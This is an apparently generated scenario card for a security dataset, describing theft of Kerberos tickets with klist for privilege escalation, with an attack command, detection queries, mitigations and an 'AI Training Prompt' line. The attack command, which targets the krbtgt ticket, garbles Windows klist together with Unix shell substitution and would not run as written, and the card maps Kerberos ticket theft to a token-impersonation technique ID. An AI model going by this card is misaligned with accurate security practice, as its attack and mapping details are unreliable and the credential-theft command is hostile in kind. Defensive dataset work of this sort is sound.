---
type: campaign
scenario_id: 101
tactic: Privilege Escalation
technique: "T1134.001: Token Impersonation/Theft"
technique_id: T1134.001
tags: [campaign, lotl, privilege_escalation]
---

# Stealing Kerberos ticket using klist for privilege escalation.

## Threat Description
Stealing Kerberos ticket using klist for privilege escalation.

## Attack Command
```
klist get krbtgt -c $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) > $(echo ticket$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)
```

## Detection Logic
Monitor klist: `wmic process where name='klist.exe' get commandline | findstr krbtgt`; Audit Kerberos events: Event ID 4768.

## Mitigation
Restrict klist: `icacls %windir%\System32\klist.exe /deny Everyone:RX`; Enable Kerberos auditing: `auditpol /set /subcategory:'Kerberos Authentication Service' /success:enable`.

## AI Training Prompt
Train AI to detect Kerberos ticket theft and suggest auditing configurations.

## References
- MITRE ATT&CK T1134.001: https://attack.mitre.org/techniques/T1134/001/
- CWE-269: https://cwe.mitre.org/data/definitions/269.html
